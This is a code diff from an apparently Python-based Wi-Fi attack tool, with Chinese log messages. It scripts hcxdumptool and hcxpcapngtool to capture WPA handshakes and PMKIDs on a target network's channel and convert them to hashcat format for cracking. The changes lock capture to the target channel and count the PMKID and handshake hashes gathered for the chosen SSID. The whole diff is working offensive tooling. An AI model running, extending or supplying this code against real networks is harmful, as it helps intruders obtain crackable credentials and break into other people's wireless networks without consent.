@@ -1110,8 +1110,9 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                   CH + 'ifconfig wlan0 up 2>/dev/null\n' +
                   CH + 'iw dev wlan0 set channel %s 2>/dev/null\nsleep 3\n' % ch +
                   'timeout %d ' % dur +
-                   CH + 'hcxdumptool -i wlan0 -w /tmp/scan_%d '
-                        '-t 7 --rds=2 2>&1 | tail -15\n' % rnd +
+                   CH + 'hcxdumptool -i wlan0 -c ' + str(ch) + 'a '
+                        '-w /tmp/scan_%d -t 7 --rds=2 2>&1 | tail -15\n'
+                        % rnd +
                   'echo "===CONVERT==="\n' +
                   CH + 'hcxpcapngtool --all -o /tmp/scan_%d.22000 /tmp/scan_%d '
                        '2>&1 | tail -4\n' % (rnd, rnd) +
@@ -1153,7 +1154,11 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                 except Exception:
                     pass
                 break
-        self._ev('conv', 'round=%d raw=%d got=%d' % (rnd, raw, len(hash_lines)))
+        tl0 = self._target_lines()
+        self._ev('conv', 'round=%d raw=%d got=%d tgt_pmkid=%d tgt_hs=%d' % (
+            rnd, raw, len(hash_lines),
+            sum(1 for h in tl0 if h.startswith('WPA*01')),
+            sum(1 for h in tl0 if h.startswith('WPA*02'))))
         if raw > 0 and not hash_lines:
             self._log('   ⚠️ 轉換有 %d 行但讀到 0 — 讀取路徑異常' % raw)
         self._save_pcap(rnd, ssid, bssid)
@@ -1162,7 +1167,7 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                         len(self.hash_pool)),
                        '只送 %s 相關的 %d 行' % (ssid, len(self._target_lines())))
         if not self._target_lines():
-            self._log('   本輪沒抓到 %s 的握手包 — 再抓一輪' % ssid)
+            self._log('   本輪無 %s 的握手包/PMKID — 再抓一輪' % ssid)
             for l in cap_part[-4:]:
                 if l.strip():
                     self._log('   抓包器: %s' % l.strip()[:110])
